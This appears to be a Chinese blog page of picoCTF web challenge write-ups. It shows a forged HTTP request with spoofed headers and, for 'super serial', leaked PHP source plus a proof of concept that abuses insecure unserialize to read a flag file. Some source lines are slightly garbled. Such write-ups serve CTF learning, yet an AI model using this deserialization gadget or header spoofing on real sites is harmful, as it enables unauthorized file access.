<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: mercury.picoctf.net.se:1270</span><br><span class="line">User-Agent: official PicoBrowser</span><br><span class="line">特殊浏览器</span><br><span class="line">Date: Thu, 11 Jul 2018 15:33:24 GMT</span><br><span class="line">特定时间</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: sv-SE</span><br><span class="line">语言</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: 2.56.28.0</span><br><span class="line">国家位置</span><br><span class="line">Referer: mercury.picoctf.net:1270</span><br><span class="line">Connection: close</span><br><span class="line">DNT: 1</span><br><span class="line">拒绝跟踪</span><br><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkGPoA.LOouJ_MDhpAP-qA8p1gOhTi0dUw; auth_name=QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="super-serial"><a href="#super-serial" class="headerlink" title="super serial"></a>super serial</h2><p>查看页面，一个简易的登录页面，尝试sql注入未果<br>查看robots.txt<br>得到admin.phps,直接访问失败<br>既然存在admin.phps,可能存在index.phps<br>访问获得index.php源码<br>INDEX.PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">require_once(&quot;cookie.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;]))&#123;</span><br><span class="line">	$con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">	$username = $_POST[&quot;user&quot;];</span><br><span class="line">	$password = $_POST[&quot;pass&quot;];</span><br><span class="line">	$perm_res = new permissions($username, $password);</span><br><span class="line">	if ($perm_resis_guest() || $perm_res-&gt;is_admin()) &#123;</span><br><span class="line">		setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;/&quot;);</span><br><span class="line">		header(&quot;Location: authentication.php&quot;);</span><br><span class="line">		die();</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$msg = &#x27;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?php if (isset($msg)) echo $msg; ?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>authentication.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line">class access_log</span><br><span class="line">&#123;</span><br><span class="line">	public $log_file;</span><br><span class="line"></span><br><span class="line">	function __construct($lf) &#123;</span><br><span class="line">		$this-log_file = $lf;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString() &#123;</span><br><span class="line">		return $this-&gt;read_log();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function append_to_log($data) &#123;</span><br><span class="line">		file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function read_log() &#123;</span><br><span class="line">		return file_get_contents($this-&gt;log_file);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">require_once(&quot;cookie.php&quot;);</span><br><span class="line">if(isset($perm) &amp;&amp; $perm-&gt;is_admin())&#123;</span><br><span class="line">	$msg = &quot;Welcome admin&quot;;</span><br><span class="line">	$log = new access_log(&quot;access.log&quot;);</span><br><span class="line">	$log-&gt;append_to_log(&quot;Logged in at &quot;.date(&quot;Y-m-d&quot;).&quot;\n&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$msg = &quot;Welcome guest&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>COOKIE.PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class permissions</span><br><span class="line">&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line"></span><br><span class="line">	function __construct($u, $p) &#123;</span><br><span class="line">		$this-username = $u;</span><br><span class="line">		$this-&gt;password = $p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString() &#123;</span><br><span class="line">		return $u.$p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function is_guest() &#123;</span><br><span class="line">		$guest = false;</span><br><span class="line"></span><br><span class="line">		$con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">		$username = $this-&gt;username;</span><br><span class="line">		$password = $this-&gt;password;</span><br><span class="line">		$stm = $con-&gt;prepare(&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;);</span><br><span class="line">		$stm-&gt;bindValue(1, $username, SQLITE3_TEXT);</span><br><span class="line">		$stm-&gt;bindValue(2, $password, SQLITE3_TEXT);</span><br><span class="line">		$res = $stm-&gt;execute();</span><br><span class="line">		$rest = $res-&gt;fetchArray();</span><br><span class="line">		if($rest[&quot;username&quot;]) &#123;</span><br><span class="line">			if ($rest[&quot;admin&quot;] != 1) &#123;</span><br><span class="line">				$guest = true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return $guest;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        function is_admin() &#123;</span><br><span class="line">                $admin = false;</span><br><span class="line">                $con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">                $username = $this-&gt;username;</span><br><span class="line">                $password = $this-&gt;password;</span><br><span class="line">                $stm = $con-&gt;prepare(&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;);</span><br><span class="line">                $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);</span><br><span class="line">                $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);</span><br><span class="line">                $res = $stm-&gt;execute();</span><br><span class="line">                $rest = $res-&gt;fetchArray();</span><br><span class="line">                if($rest[&quot;username&quot;]) &#123;</span><br><span class="line">                        if ($rest[&quot;admin&quot;] == 1) &#123;</span><br><span class="line">                                $admin = true;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                return $admin;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&quot;login&quot;]))&#123;</span><br><span class="line">	try&#123;</span><br><span class="line">		$perm = unserialize(base64_decode(urldecode($_COOKIE[&quot;login&quot;])));</span><br><span class="line">		$g = $perm-&gt;is_guest();</span><br><span class="line">		$a = $perm-&gt;is_admin();</span><br><span class="line">	&#125;</span><br><span class="line">	catch(Error $e)&#123;</span><br><span class="line">		die(&quot;Deserialization error. &quot;.$perm);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提示flag在目录中，不考虑sql注入。<br>看到了反序列化，考虑使用反序列化解题。<br>构造poc链：<br>目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function append_to_log($data) &#123;</span><br><span class="line">        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read_log() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;log_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这里获得flag，<br>步骤1：到达authentication.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$perm_res = new permissions($username, $password);</span><br><span class="line">if ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) &#123;</span><br><span class="line">    setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;/&quot;);</span><br><span class="line">    header(&quot;Location: authentication.php&quot;);</span><br><span class="line">    die();</span><br></pre></td></tr></table></figure>

<p>步骤2：COOKIE传入入口，$perm对象创建</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_COOKIE[&quot;login&quot;]))&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">                $perm = unserialize(base64_decode(urldecode($_COOKIE[&quot;login&quot;])));</span><br><span class="line">                $g = $perm-&gt;is_guest();</span><br><span class="line">                $a = $perm-&gt;is_admin();</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Error $e)&#123;</span><br><span class="line">                die(&quot;Deserialization error. &quot;.$perm);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>梳理流程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perm_res-&gt;cookie::login——&gt;authentication.php::read_log()——&gt;error</span><br></pre></td></tr></table></figure>
<p>构建poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class access_log</span><br><span class="line">&#123;</span><br><span class="line">    public $log_file;</span><br><span class="line"></span><br><span class="line">    function __construct($lf) &#123;</span><br><span class="line">        $this-&gt;log_file = $lf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return $this-&gt;read_log();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function append_to_log($data) &#123;</span><br><span class="line">        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function read_log() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;log_file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$perm_res = new access_log(&quot;../flag&quot;);</span><br><span class="line">$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));</span><br><span class="line">echo $perm_res_encoded;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="picobrowser"><a href="#picobrowser" class="headerlink" title="picobrowser"></a>picobrowser</h2><p>更改user-agent为picobrowser<br>获得flag。。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">hanbaiGG</p>
  <div class="site-description" itemprop="description">为什么不拉弟弟一把呢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Tue Oct 19 2021 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hanbaiGG</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.8' zIndex='-1' count='300' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  















  

  


</body>
</html>
